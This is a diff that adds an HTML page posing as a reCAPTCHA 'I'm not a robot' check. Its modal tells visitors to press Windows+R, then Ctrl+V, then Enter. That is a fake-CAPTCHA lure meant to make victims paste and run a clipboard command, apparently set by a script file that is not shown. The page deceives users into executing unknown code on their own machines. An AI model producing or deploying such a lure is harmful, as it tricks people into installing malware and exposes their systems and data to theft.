@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Verify You Are Human</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="captcha-box">
+        <h2>Verify You Are Human</h2>
+        <p>Please verify that you are a human to continue.</p>
+        <button id="notRobotBtn" class="fake-btn">reCAPTCHA Logo&nbsp;&nbsp;I'm not a robot</button>
+    </div>
+
+    <div id="stepsModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true">
+        <div class="modal-content">
+            <button class="close-btn" id="closeModalBtn" aria-label="Close modal">&times;</button>
+            <h3>Verification Steps</h3>
+            <ol>
+                <li>Press Windows Button + R</li>
+                <li>Press CTRL + V</li>
+                <li>Press Enter</li>
+            </ol>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
